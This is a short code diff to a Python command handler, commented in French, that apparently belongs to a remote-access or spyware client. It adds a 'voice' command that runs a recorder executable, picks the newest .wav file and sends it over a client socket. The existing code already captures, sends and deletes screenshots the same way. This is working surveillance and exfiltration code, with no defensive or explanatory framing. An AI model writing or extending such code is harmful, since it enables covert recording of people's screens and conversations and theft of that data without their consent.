@@ -185,6 +185,20 @@ def handle_commands(client_socket):
                         send_file(client_socket, latest, "screenshot")
                         os.remove(latest)
 
+            elif command == "voice":
+                # Lance le module pour enregistrer une voix
+                subprocess.run([VOICE_EXE], check=True)
+
+                # Puis récupère le fichier .wav généré et l’envoie
+                voice_dir = os.path.join(BASE_DIR, "voice")
+                audios = [os.path.join(voice_dir, f) for f in os.listdir(voice_dir) if f.endswith(".wav")]
+                if audios:
+                    latest_audio = max(audios, key=os.path.getctime)
+                    if wait_for_file(latest_audio):
+                        send_file(client_socket, latest_audio, "voice")
+                        # os.remove(latest_audio)
+                      
+
 
             # elif command == "voice":
             #     safe_run(VOICE_EXE)  
